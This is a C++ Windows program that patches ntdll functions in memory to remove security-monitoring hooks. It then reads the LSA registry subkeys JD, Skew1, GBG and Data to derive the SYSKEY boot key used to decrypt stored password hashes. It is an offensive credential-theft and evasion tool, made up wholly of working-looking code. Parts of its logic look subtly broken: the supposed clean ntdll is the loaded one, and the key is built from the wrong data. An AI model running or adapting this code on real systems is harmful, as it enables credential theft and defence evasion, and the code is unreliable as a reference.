#include <windows.h>
#include <imagehlp.h>
#include <iostream>
#include <iomanip>
#include <vector>

#pragma comment(lib,"imagehlp")

// --- API Unhooking ---
void unhookAPI(const char* functionName) {
    HMODULE cleanNtdll = LoadLibraryW(L"C:\\Windows\\System32\\ntdll.dll");
    if (!cleanNtdll) {
        std::cerr << "[-] Error loading clean ntdll.dll!" << std::endl;
        return;
    }

    void* cleanFunc = GetProcAddress(cleanNtdll, functionName);
    void* hookedFunc = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), functionName);
    if (!cleanFunc || !hookedFunc) {
        std::cerr << "[-] Function not found: " << functionName << std::endl;
        FreeLibrary(cleanNtdll);
        return;
    }

    BYTE originalBytes[5] = {};
    memcpy(originalBytes, cleanFunc, sizeof(originalBytes));

    DWORD oldProtect;
    VirtualProtect(hookedFunc, sizeof(originalBytes), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(hookedFunc, originalBytes, sizeof(originalBytes));
    VirtualProtect(hookedFunc, sizeof(originalBytes), oldProtect, &oldProtect);

    FreeLibrary(cleanNtdll);
}

void unhookAll() {
    unhookAPI("NtOpenKey");
    unhookAPI("NtQueryValueKey");
    unhookAPI("NtClose");
}

// --- Print Registry Class Name ---
bool printClassName(const wchar_t* subkeyName) {
    const wchar_t* basePath = L"SYSTEM\\ControlSet001\\Control\\Lsa\\";
    std::wstring fullPath = basePath + std::wstring(subkeyName);

    HKEY hKey = nullptr;
    LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] Failed to open subkey for class name " << subkeyName << L": 0x" << std::hex << status << std::endl;
        return false;
    }

    wchar_t className[256] = { 0 };
    DWORD classSize = sizeof(className) / sizeof(wchar_t);

    status = RegQueryInfoKeyW(
        hKey,
        className,
        &classSize,
        nullptr, nullptr, nullptr, nullptr,
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (status == ERROR_SUCCESS && classSize > 0) {
        std::wcout << L"[+] " << subkeyName << L" Class Name: " << className << std::endl;
    }
    else {
        std::wcout << L"[!] " << subkeyName << L" Class Name not found or empty." << std::endl;
    }

    RegCloseKey(hKey);
    return true;
}

// --- Read binary values from registry ---
bool readValue(const wchar_t* subkeyName, const wchar_t* valueName, std::vector<BYTE>& outData, const wchar_t* label) {
    const wchar_t* basePath = L"SYSTEM\\ControlSet001\\Control\\Lsa\\";
    std::wstring fullPath = basePath + std::wstring(subkeyName);

    HKEY hKey = nullptr;
    LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] Failed to open subkey " << subkeyName << L": 0x" << std::hex << status << std::endl;
        return false;
    }

    BYTE buffer[64] = {};
    DWORD size = sizeof(buffer);
    DWORD type = 0;

    status = RegQueryValueExW(hKey, valueName, nullptr, &type, buffer, &size);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] Failed to read value '" << valueName << L"' from " << subkeyName << L": 0x" << std::hex << status << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    outData.assign(buffer, buffer + size);

    std::wcout << L"[+] " << subkeyName << L" " << label << L": ";
    for (DWORD i = 0; i < size; ++i) {
        std::wcout << std::hex << std::setw(2) << std::setfill(L'0') << (int)buffer[i];
    }
    std::wcout << std::endl;

    RegCloseKey(hKey);
    return true;
}

int wmain() {
    unhookAll();

    std::vector<BYTE> jd, skew1, gbg, data;

    // Print Class Names
    printClassName(L"JD");
    printClassName(L"Skew1");
    printClassName(L"GBG");
    printClassName(L"Data");

    // Read values
    if (!readValue(L"JD", L"Lookup", jd, L"Lookup")) return 1;
    if (!readValue(L"Skew1", L"SkewMatrix", skew1, L"SkewMatrix")) return 1;
    if (!readValue(L"GBG", L"GrafBlumGroup", gbg, L"GrafBlumGroup")) return 1;
    if (!readValue(L"Data", L"Pattern", data, L"Pattern")) return 1;

    // Build raw bootkey
    std::vector<BYTE> bootkey_raw;
    bootkey_raw.insert(bootkey_raw.end(), jd.begin(), jd.begin() + 16);
    bootkey_raw.insert(bootkey_raw.end(), skew1.begin(), skew1.begin() + 16);
    bootkey_raw.insert(bootkey_raw.end(), gbg.begin(), gbg.begin() + 16);
    bootkey_raw.insert(bootkey_raw.end(), data.begin(), data.begin() + 16);

    // Apply permutation
    int BOOTKEY_PERMUTATION[16] = {
        0x8, 0x5, 0x4, 0x2,
        0xb, 0x9, 0xd, 0x3,
        0x0, 0x6, 0x1, 0xc,
        0xe, 0xa, 0xf, 0x7
    };

    std::vector<BYTE> bootkey_final(16);
    for (int i = 0; i < 16; ++i) {
        bootkey_final[i] = bootkey_raw[BOOTKEY_PERMUTATION[i]];
    }

    std::wcout << L"[+] Final BootKey: ";
    for (BYTE b : bootkey_final) {
        std::wcout << std::hex << std::setw(2) << std::setfill(L'0') << (int)b;
    }
    std::wcout << std::endl;

    return 0;
}
